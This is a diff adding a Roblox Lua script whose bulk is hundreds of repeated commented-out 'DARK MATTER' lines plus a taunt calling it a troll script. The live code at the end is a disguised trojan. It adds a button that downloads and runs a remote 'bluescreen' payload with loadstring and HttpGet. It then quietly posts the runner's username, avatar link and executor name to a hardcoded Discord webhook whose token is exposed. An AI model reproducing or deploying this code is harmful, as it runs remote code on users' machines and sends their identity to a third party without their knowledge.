@@ -1,0 +1,616 @@
+--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}
+--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}
+--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}
+--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}
+--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}
+--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}
+--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}
+--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}
+--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}
+--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--} JUST A TROLL SCRIPT HWHAAAAHAHAAAH WALA NG LIBRE SA MUNDO HOI
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--} JUST A TROLL SCRIPT HWHAAAAHAHAAAH WALA NG LIBRE SA MUNDO HOI--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--} JUST A TROLL SCRIPT HWHAAAAHAHAAAH WALA NG LIBRE SA MUNDO HOI--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--} JUST A TROLL SCRIPT HWHAAAAHAHAAAH WALA NG LIBRE SA MUNDO HOI--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--} JUST A TROLL SCRIPT HWHAAAAHAHAAAH WALA NG LIBRE SA MUNDO HOI--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--} JUST A TROLL SCRIPT HWHAAAAHAHAAAH WALA NG LIBRE SA MUNDO HOI--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--} JUST A TROLL SCRIPT HWHAAAAHAHAAAH WALA NG LIBRE SA MUNDO HOI--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--} JUST A TROLL SCRIPT HWHAAAAHAHAAAH WALA NG LIBRE SA MUNDO HOI--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--} JUST A TROLL SCRIPT HWHAAAAHAHAAAH WALA NG LIBRE SA MUNDO HOI--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--} JUST A TROLL SCRIPT HWHAAAAHAHAAAH WALA NG LIBRE SA MUNDO HOI--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--}--local A_1 = 
+--{
+--    [1] = "DARK MATTER"
+--} JUST A TROLL SCRIPT HWHAAAAHAHAAAH WALA NG LIBRE SA MUNDO HOI
+local gui = Instance.new('ScreenGui', game:service'CoreGui')
+local button = Instance.new('TextButton', gui)
+
+button.Size = UDim2.new(0, 200, 0, 100)
+button.Position = UDim2.new(.5, 0, .5, 0)
+button.Text = 'emptuy'
+
+button.MouseButton1Click:Connect(loadstring(game:HttpGet'https://github.com/RunDTM/roblox-bluescreen/raw/main/bsod.lua'))
+
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+local url = "https://discord.com/api/webhooks/975745172463829042/dbblVVZtUEOUyfszy4z2HCGsapdbp8I8nJm_Fund7PaBv7lVhvK5lVZ2KBrIWl-lwfkP"
+local data = {
+   ["content"] = "@everyone May nauto nanaman",
+   ["embeds"] = {
+       {
+           ["title"] = "**Someone Executed Your Script!**",
+           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
